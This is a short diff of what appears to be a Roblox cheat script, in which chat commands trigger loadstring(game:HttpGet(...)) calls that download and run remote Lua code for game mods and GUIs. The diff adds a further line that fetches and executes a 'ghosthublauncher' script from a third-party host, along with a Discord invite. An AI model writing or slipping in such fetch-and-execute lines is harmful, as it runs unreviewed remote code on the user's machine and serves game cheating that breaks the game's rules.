@@ -4998,6 +4998,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/theweakestskid/e/main
 loadstring(game:HttpGet("https://raw.githubusercontent.com/theweakestskid/e/main/ZOMBIE%20UPRISING%20GUN%20MOD.txt",true))()
    elseif cht:match("/e test") then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/Zombie-Attack-Gui/main/Zombie%20Attack%20V1.lua"))()
+wait(0.1)
+--Join for support https://discord.gg/FnnHGWpgk8
+loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
 
     end
 end)
